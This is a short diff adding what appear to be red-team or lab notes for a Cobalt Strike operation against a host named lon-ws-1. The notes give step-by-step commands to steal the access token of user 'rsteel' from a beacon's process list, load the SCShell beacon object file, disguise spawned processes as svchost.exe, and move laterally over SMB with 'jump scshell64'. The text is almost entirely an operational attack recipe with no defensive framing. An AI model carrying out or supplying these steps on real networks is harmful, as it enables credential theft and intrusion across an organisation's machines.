@@ -1,0 +1,10 @@
+impersonate the desired user (rsteel):
+  right-click the beacon, explore > process list
+  find a process running as rsteel, then click and 'Steal Token'
+load scshell:
+  cobalt strike > script manager
+  load, then select C:\Tools\SCShell\CS-BOF\scshell.cna
+scshell uses the service binary payload, so we must set the spawnto:
+  ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+move laterally using jump:
+  jump scshell64 lon-ws-1 smb
